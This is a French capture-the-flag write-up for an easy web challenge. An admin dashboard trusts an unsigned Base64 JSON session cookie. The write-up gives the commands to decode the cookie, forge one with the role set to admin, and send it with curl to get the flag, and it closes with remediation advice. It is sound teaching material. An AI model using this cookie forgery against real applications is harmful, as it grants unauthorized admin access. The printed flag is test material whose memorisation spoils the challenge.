# Write-up — Défi 1 : Le Cookie Empoisonné

**Catégorie** : Web / Architecture Dev  
**Niveau** : Facile  
**Flag** : `CTF{c00k13_m4n1pul4t10n_f0und}`  
**Commande de départ** : `curl http://<IP>:5000` ou navigateur

---

## Contexte

L'application expose un tableau de bord d'administration. Lors de la connexion, le serveur attribue un cookie `session_data` contenant un objet JSON encodé en Base64. Le serveur décode et fait confiance à ce cookie sans aucune vérification cryptographique (pas de HMAC, pas de JWT signé).

---

## Étapes de résolution

### 1. Observer le cookie attribué

Visiter `/` et ouvrir les outils développeur du navigateur (F12 → Application → Cookies) ou intercepter avec Burp Suite.

Le cookie `session_data` contient une chaîne Base64 :
```
eyJ1c2VyIjoiaW52aXRfZGV2Iiwicm9sZSI6Imd1ZXN0IiwiZGVidWciOmZhbHNlfQ==
```

### 2. Décoder le cookie

```bash
echo "eyJ1c2VyIjoiaW52aXRfZGV2Iiwicm9sZSI6Imd1ZXN0IiwiZGVidWciOmZhbHNlfQ==" | base64 -d
# {"user":"invit_dev","role":"guest","debug":false}
```

Le champ `"role":"guest"` est le vecteur d'élévation de privilèges.

### 3. Forger un cookie admin

```bash
echo '{"user":"invit_dev","role":"admin","debug":true}' | base64
```

### 4. Envoyer le cookie falsifié

```bash
curl http://<IP>:5000/dashboard \
  --cookie "session_data=<BASE64_ADMIN>"
```

### 5. Récupérer le flag

Le serveur répond avec :
```
CTF{c00k13_m4n1pul4t10n_f0und}
```

---

## Vulnérabilité expliquée

Le serveur fait une confiance aveugle aux données côté client. Sans signature, n'importe qui peut modifier le cookie.

**Remédiation** : Utiliser des JWT signés ou `express-session` avec un store sécurisé.
